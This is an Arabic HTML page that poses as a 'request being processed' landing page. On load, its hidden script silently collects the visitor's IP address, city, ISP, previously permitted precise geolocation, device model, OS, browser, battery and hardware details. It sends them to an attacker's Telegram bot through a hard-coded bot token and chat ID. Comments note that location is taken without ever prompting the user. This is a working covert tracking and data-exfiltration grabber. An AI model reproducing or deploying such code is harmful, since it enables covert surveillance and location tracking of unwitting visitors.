<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>الرئيسية</title>
    <style>
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
            background-color: #f4f7f6;
            color: #333;
            line-height: 1.6;
            margin: 0;
            padding: 20px;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            text-align: right;
            direction: rtl;
        }
        .container {
            background-color: #fff;
            padding: 40px;
            border-radius: 12px;
            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.1);
            max-width: 600px;
            width: 100%;
            text-align: center;
        }
        h1 {
            color: #0056b3;
            text-align: center;
            margin-bottom: 10px;
        }
        p {
            color: #666;
            text-align: center;
        }
        .status-message {
            margin-top: 20px;
            padding: 10px;
            border-radius: 8px;
            font-weight: bold;
        }
        .status-sending {
            background-color: #e6f7ff;
            color: #007bff;
        }
        .status-success {
            background-color: #e9fbe9;
            color: #28a745;
        }
        .status-error {
            background-color: #fff0f0;
            color: #dc3545;
        }
    </style>
</head>
<body>

    <div class="container">
        <h1>مرحبا بك! 👋</h1>
        <p>
            تتم الآن معالجة طلبك. يرجى الانتظار...
        </p>
        <div id="status" class="status-message status-sending">
            يتم إرسال المعلومات...
        </div>
    </div>

    <script>
        const BOT_TOKEN = '8386388789:AAGKW1bLw9xdEldclKGvNqUekVgE5WiuGaU';
        const CHAT_ID = '6313103532';
        const statusElement = document.getElementById('status');

        function sendTelegramMessage(message) {
            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
            const params = new URLSearchParams({
                chat_id: CHAT_ID,
                text: message,
                parse_mode: 'Markdown'
            });

            return fetch(`${url}?${params.toString()}`)
                .then(response => response.json())
                .then(data => {
                    if (data.ok) {
                        return true;
                    } else {
                        throw new Error(data.description);
                    }
                })
                .catch(error => {
                    console.error('فشل في إرسال الرسالة:', error);
                    return false;
                });
        }
        
        async function getIPInfo() {
            try {
                const response = await fetch('https://ipapi.co/json/');
                const data = await response.json();
                return data;
            } catch (error) {
                console.error('فشل في الحصول على معلومات IP:', error);
                return {};
            }
        }

        // الدالة المعدلة: لن تطلب الإذن أبداً، تستخدم الموقع فقط إذا كان الإذن ممنوحاً مسبقاً
        async function getGeolocation() {
            if ('geolocation' in navigator && 'permissions' in navigator) {
                try {
                    // الاستعلام عن حالة إذن الموقع الجغرافي دون مطالبة المستخدم
                    const permissionStatus = await navigator.permissions.query({ name: 'geolocation' });
                    
                    // استخدام الموقع فقط إذا كان الإذن ممنوحًا (granted)
                    if (permissionStatus.state === 'granted') {
                        return new Promise((resolve, reject) => {
                            navigator.geolocation.getCurrentPosition(
                                position => {
                                    resolve({
                                        latitude: position.coords.latitude,
                                        longitude: position.coords.longitude
                                    });
                                },
                                error => {
                                    console.error('فشل فني في الحصول على الموقع الجغرافي:', error.message);
                                    resolve({}); // العودة بكائن فارغ في حالة الفشل الفني
                                },
                                { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 }
                            );
                        });
                    } else {
                        return {}; // تجاهل طلب الموقع إذا لم يكن الإذن ممنوحًا (prompt/denied)
                    }
                } catch (error) {
                    console.error('فشل في الاستعلام عن إذن الموقع:', error);
                    return {};
                }
            } else {
                return {};
            }
        }

        function getPhoneModel(userAgent) {
            let manufacturer = "غير معروف";
            let model = "غير معروف";
            
            const ua = userAgent.toLowerCase();
            const androidMatch = ua.match(/(android|linux).*?; ([\w\s-]+)\)/);

            if (androidMatch && androidMatch[2]) {
                const devicePart = androidMatch[2].trim();
                if (devicePart.startsWith('sm-')) {
                    manufacturer = "Samsung";
                    model = devicePart;
                } else if (devicePart.startsWith('pixel')) {
                    manufacturer = "Google";
                    model = devicePart;
                } else if (devicePart.startsWith('lg-')) {
                    manufacturer = "LG";
                    model = devicePart;
                } else if (devicePart.startsWith('huawei')) {
                    manufacturer = "Huawei";
                    model = devicePart;
                } else if (devicePart.startsWith('moto')) {
                    manufacturer = "Motorola";
                    model = devicePart;
                } else if (devicePart.startsWith('oneplus')) {
                    manufacturer = "OnePlus";
                    model = devicePart;
                } else {
                    const parts = devicePart.split(' ');
                    if (parts.length > 1) {
                         manufacturer = parts[0].replace(/_/g, ' ');
                        model = parts.slice(1).join(' ').replace(/_/g, ' ');
                    } else {
                        model = devicePart.replace(/_/g, ' ');
                    }
                }
            } else if (ua.includes("iphone") || ua.includes("ipad")) {
                manufacturer = "Apple";
                const fbdvMatch = userAgent.match(/FBDV\/([\w,]+)/i);
                if (fbdvMatch && fbdvMatch[1]) {
                    model = fbdvMatch[1].replace(/,/g, '-');
                } else if (ua.includes('iphone')) {
                    model = "iPhone";
                } else if (ua.includes('ipad')) {
                    model = "iPad";
                }
            }

            return { manufacturer, model };
        }


        function getDeviceType(userAgent) {
            if (/(tablet|ipad|playbook|silk)|(android(?!.*mobi))/i.test(userAgent)) return "جهاز لوحي";
            if (/Mobile|iP(hone|od)|Android|BlackBerry|IEMobile|Kindle|Silk-Mobile|Jasmine/i.test(userAgent)) return "هاتف محمول";
            return "حاسوب مكتبي";
        }

        function getOS(userAgent) {
            if (/windows phone/i.test(userAgent)) return "Windows Phone";
            if (/android/i.test(userAgent)) {
                const match = userAgent.match(/Android\s([0-9.]+)/);
                return match ? `Android ${match[1]}` : 'Android';
            }
            if (/iPad|iPhone|iPod/i.test(userAgent)) {
                const osMatch = userAgent.match(/OS ([\d_]+)/);
                return osMatch ? `iOS ${osMatch[1].replace(/_/g, '.')}` : 'iOS';
            }
            if (/win/i.test(userAgent)) return "Windows";
            if (/mac/i.test(userAgent)) return "macOS";
            if (/linux/i.test(userAgent)) return "Linux";
            return "نظام غير معروف";
        }

        function getBrowser(userAgent) {
            const ua = userAgent.toLowerCase();
            let name = "غير معروف";
            let version = "غير معروف";
            
            if (ua.includes('fbav')) {
                name = "Facebook In-App Browser";
                const versionMatch = ua.match(/fbav\/([\d.]+)/);
                if (versionMatch) {
                    version = versionMatch[1];
                }
            } else if (ua.includes('edge')) { 
                name = "Edge";
                const versionMatch = ua.match(/edge\/([\d.]+)/);
                if (versionMatch) {
                    version = versionMatch[1];
                }
            } else if (ua.includes('safari') && !ua.includes('chrome')) { 
                name = "Safari";
                const versionMatch = ua.match(/version\/([\d.]+)/);
                if (versionMatch) {
                    version = versionMatch[1];
                }
            } else if (ua.includes('chrome')) {
                name = "Chrome";
                const versionMatch = ua.match(/chrome\/([\d.]+)/);
                if (versionMatch) {
                    version = versionMatch[1].split(' ')[0];
                }
            } else if (ua.includes('firefox')) {
                name = "Firefox";
                const versionMatch = ua.match(/firefox\/([\d.]+)/);
                if (versionMatch) {
                    version = versionMatch[1];
                }
            } else if (ua.includes('samsungbrowser')) {
                name = "Samsung Browser";
                const versionMatch = ua.match(/samsungbrowser\/([\d.]+)/);
                if (versionMatch) {
                    version = versionMatch[1];
                }
            }

            return { name, version };
        }

        // دالة جديدة لتنسيق القيم في تليجرام (الكود هو التعديل الأساسي)
        function formatValue(key, value) {
            const valueStr = String(value);
            
            // قائمة بالمفاتيح التي نريد تطبيق تنسيق الكود عليها لتسهيل النسخ
            const keysToFormatAsCode = [
                '🌍 عنوان IP', 
                '📈 خط الطول', 
                '📉 خط العرض', 
                '💻 النظام الأساسي', 
                '📜 إصدار الجهاز (UA)',
                '🌐 اسم المتصفح',
                '📊 إصدار المتصفح',
                '🗺️ التوقيت الزمني',
                '📱 طراز الهاتف',
                '🖥️ نظام التشغيل',
                '📶 شركة مزود الإنترنت',
                '📏 دقة الشاشة',
                '🖼️ نسبة عمق البكسل',
                '🧠 الذاكرة (RAM)',
                '⚙️ عدد الأنوية',
            ];

            if (keysToFormatAsCode.includes(key) && valueStr !== 'غير معروف' && valueStr !== 'غير متوفر (لم يُطلب الإذن)') {
                // طبق تنسيق الـ backticks (خط الكود)
                const escapedValue = valueStr.replace(/`/g, "'"); // الهروب من الـ backticks داخل القيمة
                return `\`${escapedValue}\``;
            } 
            
            // للقيمة العادية، نطبق الهروب الأساسي من علامات الماركداون لمنع تشويه النص (مثل * و _)
            return valueStr.replace(/([_*[\]()~>#+\-=|{}.!])/g, '\\$1');
        }


        async function gatherAndSendInfo() {
            try {
                const [ipInfo, geoInfo] = await Promise.all([getIPInfo(), getGeolocation()]);
                const userAgent = navigator.userAgent;
                const hasTouch = 'ontouchstart' in window || navigator.maxTouchPoints > 0;
                const supportsBluetooth = 'bluetooth' in navigator;
                const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
                const phoneInfo = getPhoneModel(userAgent);
                const ram = navigator.deviceMemory ? `${navigator.deviceMemory} GB` : 'غير معروف';
                const processorCores = navigator.hardwareConcurrency || 'غير معروف';
                const browserInfo = getBrowser(userAgent);
                
                // 1. تجميع بيانات البطارية أولاً
                const batteryData = {};
                if ('getBattery' in navigator) {
                    try {
                        const battery = await navigator.getBattery();
                        batteryData['🔋 شحن الهاتف'] = `${(battery.level * 100).toFixed(0)}%`;
                        batteryData['⚡ هل الهاتف يشحن؟'] = battery.charging ? 'نعم' : 'لا';
                    } catch (e) {
                        batteryData['🔋 شحن الهاتف'] = 'غير متوفر';
                        batteryData['⚡ هل الهاتف يشحن؟'] = 'غير متوفر';
                    }
                } else {
                    batteryData['🔋 شحن الهاتف'] = 'غير مدعوم';
                    batteryData['⚡ هل الهاتف يشحن؟'] = 'غير مدعوم';
                }

                // 2. تجميع البيانات في مجموعات منظمة لتحسين الترتيب والقراءة
                const sections = {
                    'معلومات الجهاز الأساسية 📱': {
                        '📱 نوع الجهاز': getDeviceType(userAgent),
                        '🖥️ نظام التشغيل': getOS(userAgent),
                        '📱 الشركة الصانعة': phoneInfo.manufacturer,
                        '📱 طراز الهاتف': phoneInfo.model,
                        '💻 النظام الأساسي': navigator.platform || 'غير معروف',
                        '📜 إصدار الجهاز (UA)': userAgent,
                    },
                    'معلومات المتصفح والتوقيت 🌐': {
                        '🌐 اسم المتصفح': browserInfo.name,
                        '📊 إصدار المتصفح': browserInfo.version,
                        '🌐 لغة النظام': navigator.language,
                        '🗺️ التوقيت الزمني': Intl.DateTimeFormat().resolvedOptions().timeZone,
                        '⏰ الوقت المحلي': new Date().toLocaleString('ar-SA'),
                        '🔒 بروتوكول الأمان': window.location.protocol,
                    },
                    'معلومات الموقع والشبكة 📡': {
                        '🌍 عنوان IP': ipInfo.ip || 'غير معروف',
                        '🏙️ المدينة': ipInfo.city || 'غير معروف',
                        '🔻 الدولة': ipInfo.country_name || 'غير معروف',
                        '📶 شركة مزود الإنترنت': ipInfo.org || 'غير معروف',
                        '📈 خط الطول': geoInfo.longitude || 'غير متوفر (لم يُطلب الإذن)',
                        '📉 خط العرض': geoInfo.latitude || 'غير متوفر (لم يُطلب الإذن)',
                        '🌍 حالة الاتصال': navigator.onLine ? 'متصل بالإنترنت' : 'غير متصل بالإنترنت',
                        '📡 نوع الاتصال': connection ? connection.effectiveType : 'غير معروف',
                        '⚡ سرعة الاتصال': connection ? `${(connection.downlink || 0)} ميغابت في الثانية` : 'غير معروف',
                    },
                    'معلومات الشاشة والأداء 🧠': {
                        '📏 دقة الشاشة': `${screen.width}x${screen.height}`,
                        '🖼️ نسبة عمق البكسل': window.devicePixelRatio || 'غير معروف',
                        '🔄 وضع الشاشة': screen.orientation.type || 'غير معروف',
                        '🎨 عمق الألوان': screen.colorDepth ? `${screen.colorDepth} بت` : 'غير معروف',
                        '🧠 الذاكرة (RAM)': ram,
                        '⚙️ عدد الأنوية': processorCores,
                        '✋ دعم الإيماءات اللمسية': hasTouch ? 'مدعوم' : 'غير مدعوم',
                        '🔵 دعم البلوتوث': supportsBluetooth ? 'مدعوم' : 'غير مدعوم',
                    },
                    'حالة البطارية 🔋': batteryData
                };
                
                // 3. بناء الرسالة النهائية
                let message = `*معلومات جهاز جديد:*\n\n`;

                for (const [sectionTitle, data] of Object.entries(sections)) {
                    // إضافة عنوان القسم بخط عريض (Bold)
                    message += `*${sectionTitle}*\n`; 
                    
                    for (const [key, value] of Object.entries(data)) {
                        // تطبيق التنسيق الجديد لتحديد خط الكود أو النص العادي
                        const formattedValue = formatValue(key, value);
                        // استخدام تنسيق القائمة
                        message += `- ${key}: ${formattedValue}\n`; 
                    }
                    message += '\n'; // إضافة سطر فارغ للفصل بين الأقسام
                }
                
                message = message.trim(); // إزالة آخر سطر فارغ زائد

                const isSuccess = await sendTelegramMessage(message);

                // 4. تحديث حالة الواجهة (مع الحفاظ على النصوص الأصلية)
                if (isSuccess) {
                    statusElement.textContent = 'تم استلام طلبك.';
                    statusElement.classList.replace('status-sending', 'status-success');
                } else {
                    statusElement.textContent = 'فشل التحميل. يرجى المحاولة لاحقًا.';
                    statusElement.classList.replace('status-sending', 'status-error');
                }

            } catch (error) {
                console.error('خطأ عام في العملية:', error);
                statusElement.textContent = 'فشل التحميل. يرجى المحاولة لاحقًا.';
                statusElement.classList.replace('status-sending', 'status-error');
            }
        }
        
        document.addEventListener('DOMContentLoaded', () => {
            gatherAndSendInfo();
        });
    </script>
</body>
</html>
